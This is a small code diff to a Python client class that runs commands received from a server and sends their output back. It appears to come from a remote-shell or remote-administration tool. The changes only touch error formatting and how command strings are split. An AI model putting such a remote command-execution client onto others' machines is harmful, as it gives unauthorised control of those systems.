@@ -122,17 +122,19 @@ class client:
                 os.chdir(new_dir)
                 return "\n"
             except Exception as error:
-                return str(error)
+                return str(error) + "\n"
 
         # run the command from the server
         if len(cmd) > 0:
             try:
-                result = subprocess.Popen(cmd[:].decode("utf-8"), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                cmd = cmd[:].decode("utf-8")
+                cmd = cmd.split(" ")
+                result = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                 result_in_bytes = result.stdout.read() + result.stderr.read()
                 result_in_string = str(result_in_bytes, "utf-8")
                 return result_in_string
             except Exception as error:
-                return str(error)
+                return str(error) + "\n"
 
         # this means the command is empty, returns no result in this case
         return "\n"
